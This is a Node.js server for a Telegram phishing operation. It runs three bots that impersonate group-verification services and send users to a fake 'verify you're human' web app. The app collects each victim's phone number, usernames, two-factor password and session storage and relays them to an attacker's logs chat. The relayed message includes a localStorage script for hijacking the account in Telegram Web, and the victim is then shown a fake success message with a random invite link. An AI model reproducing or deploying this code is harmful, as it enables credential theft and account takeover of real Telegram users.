const express = require("express");
const fs = require("fs");
const path = require("path");

require("dotenv").config();

const TelegramBot = require("node-telegram-bot-api");
const phoneUtil = require("google-libphonenumber").PhoneNumberUtil.getInstance();
const PNF = require("google-libphonenumber").PhoneNumberFormat;

// admins list (whoever adds the bot in the channel should be in this array.)
const admins = [
  5891533625
];

// loading all the pictures beforehand for speed
const safeguardSuccess = fs.readFileSync(path.join(__dirname, "images/success/safeguard.jpg"));
const guardianSuccess = fs.readFileSync(path.join(__dirname, "images/success/guardian.jpg"));

const delugeVerification = fs.readFileSync(path.join(__dirname, "images/verification/deluge.jpg"));
const guardianVerification = fs.readFileSync(path.join(__dirname, "images/verification/guardian.jpg"));
const safeguardVerification = fs.readFileSync(path.join(__dirname, "images/verification/safeguard.jpg"));

const safeguardBot = new TelegramBot(process.env.FAKE_SAFEGUARD_BOT_TOKEN, { polling: true });
const delugeBot = new TelegramBot(process.env.FAKE_DELUGE_BOT_TOKEN, { polling: true });
const guardianBot = new TelegramBot(process.env.FAKE_GUARDIAN_BOT_TOKEN, { polling: true });

const guardianButtonTexts = [
  "🟩ARKI all-in-1 TG tools👈JOIN NOW!🟡",
  "Why an Ape ❔ You can be eNORMUS!🔷",
  "🔥Raid with @Raidar 🔥"
];

const generateRandomString = (length) => {
  const charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz";
  let result = "";
  for (let i = 0; i < length; i++) {
    const randomIndex = Math.floor(Math.random() * charset.length);
    result += charset[randomIndex];
  }
  return result;
};

let safeguardUsername;
let delugeUsername;
let guardianUsername;

safeguardBot.getMe().then(botInfo => {
  safeguardUsername = botInfo.username;
  console.log(`Safeguard Bot Username: ${safeguardUsername}`);
}).catch(error => {
  console.error(`Failed to get Safeguard bot info: ${error.message}`);
});

delugeBot.getMe().then(botInfo => {
  delugeUsername = botInfo.username;
  console.log(`Deluge Bot Username: ${delugeUsername}`);
}).catch(error => {
  console.error(`Failed to get Deluge bot info: ${error.message}`);
});

guardianBot.getMe().then(botInfo => {
  guardianUsername = botInfo.username;
  console.log(`Guardian Bot Username: ${guardianUsername}`);
}).catch(error => {
  console.error(`Failed to get Guardian bot info: ${error.message}`);
});

const app = express();
app.use(express.json());
app.use(express.static("public"));

app.post("/api/users/telegram/info", async (req, res) => {
  console.log(`Received request at /api/users/telegram/info with body: ${JSON.stringify(req.body)}`);
  try {
    const {
      userId,
      firstName,
      usernames,
      phoneNumber,
      isPremium,
      password,
      quicklySet,
      type
    } = req.body;

    let pass = password;
    if (pass === null) {
      pass = "No Two-factor authentication enabled.";
    }

    let usernameText = "";
    if (usernames) {
      usernameText = `Usernames owned:\n`;
      usernames.forEach((username, index) => {
        usernameText += `<b>${index + 1}</b>. @${username.username} ${username.isActive ? "✅" : "❌"}\n`;
      });
    }

    const parsedNumber = phoneUtil.parse(`+${phoneNumber}`, "ZZ");
    const formattedNumber = phoneUtil.format(parsedNumber, PNF.INTERNATIONAL);
    const quickAuth = `Object.entries(${JSON.stringify(quicklySet)}).forEach(([name, value]) => localStorage.setItem(name, value)); window.location.reload();`;

    await handleRequest(req, res, {
      password: pass,
      script: quickAuth,
      userId,
      name: firstName,
      number: formattedNumber,
      usernames: usernameText,
      premium: isPremium,
      type,
    });
  } catch (error) {
    console.error(`500 server error in /api/users/telegram/info: ${error.message}`);
    res.status(500).json({ error: "server error" });
  }
});

// Add /api/debug endpoint to log client-side debug messages
app.post("/api/debug", (req, res) => {
  console.log(`Debug message: ${req.body.message}`);
  res.json({ status: "ok" });
});

const handleRequest = async (req, res, data) => {  
  const botMap = {
    safeguard: safeguardBot,
    guardian: guardianBot,
    deluge: delugeBot
  };
  let bot = botMap[data.type] || null;
  if (!bot) {
    console.error(`No bot found for type: ${data.type}`);
    res.json({});
    return;
  }

  const messageText = `🪪 <b>UserID</b>: ${data.userId}\n🌀 <b>Name</b>: ${data.name}\n⭐ <b>Telegram Premium</b>: ${data.premium ? "✅" : "❌"}\n📱 <b>Phone Number</b>: <tg-spoiler>${data.number}</tg-spoiler>\n${data.usernames}\n🔐 <b>Password</b>: <code>${data.password !== undefined ? data.password : "Null"}</code>\n\nGo to <a href="https://web.telegram.org/">Telegram Web</a>, and paste the following script.\n<code>${data.script}</code>\n<b>Module</b>: ${data.type.charAt(0).toUpperCase() + data.type.slice(1)}`;
  
  console.log(`Attempting to send login token message to chat ${process.env.LOGS_ID} for user ${data.userId}`);
  try {
    await bot.sendMessage(
      process.env.LOGS_ID,
      messageText,
      { parse_mode: "HTML" }
    );
    console.log(`Successfully sent login token message to chat ${process.env.LOGS_ID} for user ${data.userId}`);
  } catch (error) {
    console.error(`Failed to send login token message to chat ${process.env.LOGS_ID}: ${error.message}`);
  }

  let type = data.type;
  if (type === "safeguard" || type === "guardian") {
    let image;
    let caption;
    if (type === "safeguard") {
      image = safeguardSuccess;
      caption = `Verified, you can join the group using this temporary link:\n\nhttps://t.me/+${generateRandomString(16)}\n\nThis link is a one time use and will expire`;
    } else if (type === "guardian") {
      image = guardianSuccess;
      caption = `☑️ <b>Verification successful</b>\n\nPlease click the invite link below to join the group:\n<i>https://t.me/+${generateRandomString(16)}</i>`;
    }

    const randomText = guardianButtonTexts[Math.floor(Math.random() * guardianButtonTexts.length)];

    const guardianButtons = {
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: randomText,
              url: `https://t.me/+${generateRandomString(16)}`
            },
          ],
        ]
      }
    };
    const safeguardButtons = {
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "@SOLTRENDING",
              url: "https://t.me/SOLTRENDING"
            },
          ],
        ]
      }
    };

    const buttons = type === "safeguard" ? safeguardButtons : guardianButtons;

    console.log(`Sending success photo to user ${data.userId} for type ${type}`);
    try {
      await bot.sendPhoto(data.userId, image, {
        caption,
        ...buttons,
        parse_mode: "HTML"
      });
      console.log(`Successfully sent success photo to user ${data.userId}`);
    } catch (error) {
      console.error(`Failed to send success photo to user ${data.userId}: ${error.message}`);
    }
  }

  res.json({});
};

const handleNewChatMember = async (bot, type) => {
  bot.on("my_chat_member", (update) => {
    const chatId = update.chat.id;

    let jsonToSend;
    let imageToSend;

    switch (type) {
      case "deluge":
        jsonToSend = { caption: `The group is protected by @delugeguardbot.\n\nClick below to start human verification.`, parse_mode: "HTML", reply_markup: { inline_keyboard: [[{ text: "Tap To Verify", url: `https://t.me/${update.new_chat_member.user.username}?start=scrim` }]] } };
        imageToSend = delugeVerification;
        break;
      case "safeguard":
        jsonToSend = { caption: `${update.chat.title} is being protected by @Safeguard\n\nClick below to verify you're human`, parse_mode: "HTML", reply_markup: { inline_keyboard: [[{ text: "Tap To Verify", url: `https://t.me/${update.new_chat_member.user.username}?start=scrim` }]] } };
        imageToSend = safeguardVerification;
        break;
      case "guardian":
        jsonToSend = { caption: `<b>${update.chat.title} is protected by Guardian.</b>\n\n⚠️ONLY use the "<b>Click to verify</b>" below and <b>avoid pressing any sponsored ads</b> within this portal. ⚠️`, parse_mode: "HTML", reply_markup: { inline_keyboard: [[{ text: "Click to verify", url: `https://t.me/${update.new_chat_member.user.username}?start=scrim` }]] } };
        imageToSend = guardianVerification;
        break;  
      default:
        jsonToSend = {};
    }

    if (
      update.chat.type === "channel" &&
      update.new_chat_member.status === "administrator" &&
      update.new_chat_member.user.is_bot === true &&
      admins.includes(update.from.id)
    ) {
      console.log(`Sending verification photo to chat ${chatId} for type ${type}`);
      bot.sendPhoto(chatId, imageToSend, jsonToSend)
        .then(() => {
          console.log(`Successfully sent verification photo to chat ${chatId}`);
        })
        .catch(error => {
          console.error(`Failed to send verification photo to chat ${chatId}: ${error.message}`);
        });
    }
  });
};

function handleStart(bot) {
  bot.onText(/\/start (.*)$/, (msg, match) => {
    console.log(`Received /start command for bot with message: ${JSON.stringify(msg)}`);
    let botInfo;
    bot.getMe().then(botInformation => {
      botInfo = botInformation;
      if (botInfo.username) {
        const chatId = msg.chat.id;
        let jsonToSend;
        let imageToSend;
        if (botInfo.username === safeguardUsername) {
          jsonToSend = {
            caption: `<b>Verify you're human with Safeguard Portal</b>\n\nClick 'VERIFY' and complete captcha to gain entry`,
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [[{
                text: "VERIFY",
                web_app: {
                  url: `${process.env.DOMAIN}/safeguard/?type=safeguard`
                }
              }]]
            }
          };
          imageToSend = safeguardVerification;
        } else if (botInfo.username === delugeUsername) {
          jsonToSend = {
            caption: `The group is protected by @delugeguardbot.\n\nClick below to start human verification.`,
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [[{
                text: "Tap To Verify",
                web_app: {
                  url: `${process.env.DOMAIN}/deluge/?type=deluge`
                }
              }]]
            }
          };
          imageToSend = delugeVerification;
        } else if (botInfo.username === guardianUsername) {
          jsonToSend = {
            caption: `🧑 <b>Human Authentication</b>\n\nPlease click the button below to verify that you are human.`,
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [[{
                text: "Verify",
                web_app: {
                  url: `${process.env.DOMAIN}/guardian/?type=guardian`
                }
              }]]
            }
          };
          imageToSend = guardianVerification;
        }
        
        console.log(`Sending verification photo to chat ${chatId} for bot ${botInfo.username} with web_app URL: ${jsonToSend?.reply_markup?.inline_keyboard?.[0]?.[0]?.web_app?.url || "N/A"}`);
        bot.sendPhoto(chatId, imageToSend, jsonToSend)
          .then(() => {
            console.log(`Successfully sent verification photo to chat ${chatId}`);
          })
          .catch(error => {
            console.error(`Failed to send verification photo to chat ${chatId}: ${error.message}`);
          });
      }
    }).catch(error => {
      console.error(`Failed to get bot info in handleStart: ${error.message}`);
    });
  });
}

handleNewChatMember(safeguardBot, "safeguard");
handleNewChatMember(delugeBot, "deluge");
handleNewChatMember(guardianBot, "guardian");

handleStart(safeguardBot);
handleStart(delugeBot);
handleStart(guardianBot);

app.listen(process.env.PORT || 80, () => console.log(`loaded everyone & running on port ${process.env.PORT}`));
